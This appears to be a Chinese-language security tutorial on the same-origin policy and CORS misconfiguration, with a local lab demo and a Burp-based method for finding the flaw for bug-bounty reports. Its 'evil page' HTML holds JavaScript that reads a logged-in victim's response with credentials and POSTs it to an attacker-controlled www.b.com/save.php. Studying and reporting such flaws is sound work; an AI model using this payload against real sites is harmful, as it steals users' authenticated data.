#### CORS跨域读取学习 ####
<b>0x00同源策略</b>
SOP同源策略，该策略是浏览器的一个安全基操，如果没有同源策略，那么你打开了一个合法网站，又打开了一恶意网站。恶意网站的脚本能够随意的操作合法网站可操作资源，没有任何限制。

同源策略介绍:[Same-origin policy - Wikipedia](https://en.wikipedia.org/wiki/Same-origin_policy)
浏览器同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读取读写对方的资源。那么何为同源：
|协议|域名|端口|是否同源
|-|-|-|-|
|相同|相同|相同|是
|不同|相同|相同|否
|相同|相同|不相同|否

![](https://ask.qcloudimg.com/http-save/yehe-1539004/q2owt35awt.jpeg?imageView2/2/w/1620)

一个最好的例子：
```
你在本地手动远程读取百度的logo，以读取到的二进制数据为准。很快你就会发现不行
这都是同源策略
```

>CORS，跨域资源共享（Cross-origin resource sharing），是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。

<b>0x01跨域访问的一些场景</b>
>1.比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。
2.程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。
3.电商网站想通过用户浏览器加载第三方快递网站的物流信息。
4.子站域名希望调用主站域名的用户资料接口，并将数据显示出来。

<b>0x03CORS漏洞的攻击流程</b>
Access-Control-Allow-Origin:*
Access-Control-Allow-Credentials:true
```
通过指定：Access-Control-Allow-Origin允许那些来源可以跨域读取本站的资源，当Access-Control-Allow-Origin为默认的时候。允许任意来源来访问本站的资源，那么就导致了跨域读取

当站点没有指定Access-Control-Allow-Origin的时候，用户访问恶意站点的脚本，恶意站点的脚本请求站点。会被浏览器的同源策略默认拦截

当站点设置了Access-Control-Allow-Origin:*，用户访问恶意站点的脚本，恶意站点的脚本请求站点。浏览器的同源策略不起作用。因为被请求的站点允许任何来源跨域读取本站内容
```

攻击者手法：
攻击者利用cors漏洞把A.com的orgin改成接收用户信息的在线脚本B.com，然后生成一个链接引诱受害者去点击，如果受害者正好登录了A.com 并且点击了这个链接，则会把cookie发送到B.com

实例：
物理机win7:www.a.com
Kali:www.b.com


www.a.com/cors/a.php
```php
<?php
header("Content-Type: text/html;charset=utf-8");
if (isset($_COOKIE['demo'])){
    echo "欢迎管理员登录";
}else{
    echo '你好,游客';
}
if(isset($_GET['user'])){
    if($_GET['user']=='admin'){
        setcookie('demo','1');
    }
}
?>
```

www.b.com/demo.html
```html
<!DOCTYPE>
<html>
<h1>Hello I evil page. </h1>
<script type="text/javascript">
function loadXMLDoc()
{
    var xhr1;
    var xhr2;
    if(window.XMLHttpRequest)
    {
        xhr1 = new XMLHttpRequest();
        xhr2 = new XMLHttpRequest();
    }
    else
    {
        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");
        xhr2= new ActiveXObject("Microsoft.XMLHTTP");
    }
    xhr1.onreadystatechange=function()
    {
        if(xhr1.readyState == 4 && xhr1.status == 200) //if receive xhr1 response
        {
            var datas=xhr1.responseText;
            xhr2.open("POST","http://www.b.com/save.php","true");
            xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
            xhr2.send("T1="+escape(datas));      
        }
    }
    xhr1.open("GET","http://www.a.com/cors/login.php","true") //request user page.
    xhr1.withCredentials = true;        //request with cookie
    xhr1.send();
}
loadXMLDoc();
</script>
</html>
```
login.php没有设置Access-Control-Allow-Origin
测试如下：
自动帮我们设置了origin头
![AJg1P0.md.png](https://s2.ax1x.com/2019/03/23/AJg1P0.md.png)


当我们放包，继续让浏览器执行的时候

(浏览器阻止了跨域读取)
![AJgaZ9.md.png](https://s2.ax1x.com/2019/03/23/AJgaZ9.md.png)

在login.php设置Access-Control-Allow-Origin
```php
<?php
header("Content-Type: text/html;charset=utf-8");
header("Access-Control-Allow-Origin: http://b.com");
header("Access-Control-Allow-Credentials: true");
if (isset($_COOKIE['demo'])){
    echo "欢迎管理员登录";
}else{
    echo '你好,游客';
}
if(isset($_GET['user'])){
    if($_GET['user']=='admin'){
        setcookie('demo','1');
    }
}
?>
```

重新请求一下,发现返回的响应里面有（Access-Control-Allow-Origin）
PS:在浏览器执行下一步执行用burp抓包重放是可以看到响应结果的
![AJRw36.png](https://s2.ax1x.com/2019/03/23/AJRw36.png)
```
Access-Control-Allow-Origin指是允许访问的源
Access-Control-Allow-Credentials指的是允许带上cookie访问资源
```
最后结果：
![AJWSrF.png](https://s2.ax1x.com/2019/03/23/AJWSrF.png)


![AJROCq.png](https://s2.ax1x.com/2019/03/23/AJROCq.png)

这里要注意的是，我们也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。
![AJRsDe.png](https://s2.ax1x.com/2019/03/23/AJRsDe.png)

实际上挖掘跨域资源共享的要点就是：见到有origin请求返回的响应有Access-Control-Allow-Origin，尝试修改Origin头为自己的接收地址就行，详细看下面的secqun的文章。

<b>0x04总结</b>
实战挖SRC例子：
[secqun-前端跨域资源共享](https://secquan.org/Notes/1068983)
遨游浏览器没有做同源策略
[Maxthon for mac 获取保存的密码/跨域信息读取/任意文件写入 \| WooYun-2015-155672 | WooYun.org](http://www.anquan.us/static/bugs/wooyun-2015-0155672.html)

由于同源策略，会阻断另一个站点调用脚本来访问其他站点的资源。但是如果被访问的那个站点默认设置了Access-Control-Allow-Origin，默认是允许任何来源访问本站资源。至于能不能带cookie得看Access-Control-Allow-Credentials是否为tre。当Access-Control-Allow-Origin条件成立，那么浏览器的同源策略就拦截不了


检测该漏洞的方法就是如果遇见有Origin头部请求，扔到burp重放模块。第一次直接请求，会返回结果。看到Access-Control-Allow-Origin允许跨域本站的来源。然后你尝试修改origin到你的接收地址，如果超过的话就代表有"CORS跨域资源共享漏洞"。那么你就可以写个poc做验证，然后交给对应的SRC